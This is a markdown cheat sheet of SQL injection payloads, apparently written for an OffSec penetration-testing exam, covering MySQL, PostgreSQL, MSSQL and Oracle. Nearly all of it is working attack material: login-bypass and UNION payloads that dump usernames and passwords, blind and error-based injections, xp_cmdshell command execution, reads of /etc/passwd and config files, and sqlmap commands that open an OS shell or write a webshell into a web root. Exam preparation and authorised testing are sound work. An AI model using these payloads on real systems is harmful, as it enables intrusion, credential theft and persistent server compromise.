
# 🛡️ SQL Injection Attack Reference — OffSec Exam Edition

> ✅ Focus: MySQL, PostgreSQL, Oracle, MSSQL | 🔎 Goal: Rapid Identification & Exploitation

---

## 🧩 MySQL Injection Quick Hits

### Recon
```sql
SELECT VERSION();
SELECT CURRENT_USER();
SELECT DATABASE();
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
SELECT table_name FROM information_schema.tables WHERE table_schema='app';
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='menu';
```

### Common Exploits
```sql
' OR 1=1 --          -- Bypass login
' UNION SELECT NULL, username, password FROM users --  -- Dump users
extractvalue('', CONCAT('>', (SELECT version())))  -- Error-based info leak
' AND SLEEP(5) --    -- Time-based blind injection
```

---

## 🧩 PostgreSQL Injection

### Recon
```sql
SELECT version();
SELECT current_user;
SELECT datname FROM pg_database;
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
SELECT column_name FROM information_schema.columns WHERE table_name='table';
```

### Exploits
```sql
' OR 1=1 --  -- Bypass
' UNION SELECT NULL, username, password FROM users --  -- Dump
pg_read_file('postgresql.conf', 0, 1000);  -- Read files (superuser)
SELECT flag FROM flag_table;  -- Extract flag
```

---

## 🧩 SQL Server Injection (MSSQL)

### Recon
```sql
SELECT @@version;
SELECT SYSTEM_USER;
SELECT name FROM sys.databases;
SELECT * FROM information_schema.tables;
SELECT COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME='users';
```

### Exploits
```sql
' OR 1=1 --  -- Bypass
CAST((SELECT name FROM sysobjects WHERE type='U') AS INT)  -- Error-based table names
WAITFOR DELAY '00:00:05' --  -- Time delay
EXEC xp_cmdshell('dir');  -- OS command exec (if enabled)
```

---

## 🧩 Oracle Injection

### Recon
```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT owner FROM all_tables GROUP BY owner;
SELECT table_name FROM all_tables WHERE owner='SYS';
```

### Exploits
```sql
SELECT DBMS_METADATA.GET_DDL('TABLE', 'table_name') FROM dual;  -- Get table schema
TO_CHAR(DBMS_XMLGEN.GETXML('SELECT banner FROM v$version'))  -- Error-based
```

---

## 🧠 SQL Injection Types

| Type       | Example |
|------------|---------|
| Boolean    | `' AND 1=1 --` |
| Error-Based | `extractvalue('', concat('>', (SELECT version())))` |
| Union      | `' UNION SELECT NULL, username, password FROM users --` |
| Time-Based | `' AND SLEEP(5) --` |
| Stacked    | `'; SELECT user(); --` |

---

## ⚙️ SQLMap Usage

```bash
sqlmap -u "http://site.com/page.php?id=1" --risk=3 --level=5 --dbs --batch
sqlmap -u "http://site.com/index.php?id=8" -D dbname -T flags --columns --batch
sqlmap -u "http://target.com/?id=1" --os-shell  # If RCE is possible
sqlmap -r burp_request.txt --dbms=PostgreSQL --dump --batch
```

### Upload Webshell
```bash
sqlmap -u "http://site.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php" --batch
```

---

## 🧾 Error-Based Enumeration (MSSQL)

```sql
CAST((SELECT TOP 1 flag FROM app.dbo.flags) AS INT);
CAST((SELECT name FROM app.sys.tables ORDER BY name OFFSET 2 ROWS FETCH NEXT 1 ROWS ONLY) AS INT);
```

---

## 🧪 UNION-Based Enumeration

```sql
')) UNION SELECT 1, schema_name, '', 1 FROM information_schema.schemata -- -
')) UNION SELECT 1, table_name, '', 1 FROM information_schema.tables WHERE table_schema='target_db' -- -
')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='target_table' -- -
')) UNION SELECT 1, flag, '', 1 FROM target_table -- -
```

---

## 🔐 File Read in MySQL

```sql
SELECT @@GLOBAL.secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/dump.txt';
```

## 🔐 File Read in PostgreSQL

```sql
SELECT pg_read_file('postgresql.conf', 0, 1000);
```

---

## 💡 Tips for Exam

- Automate table/column discovery (loop offset).
- Use UNION where possible for quick data dump.
- Fall back to blind/time-based if no error shown.
- Document every discovered DB/table/column/value immediately.
- Prepare payloads for each DBMS in your clipboard/snippets.

---

> 🏁 **Good luck on the exam — 5 machines in 24 hours! Efficiency and methodology are your greatest weapons.**

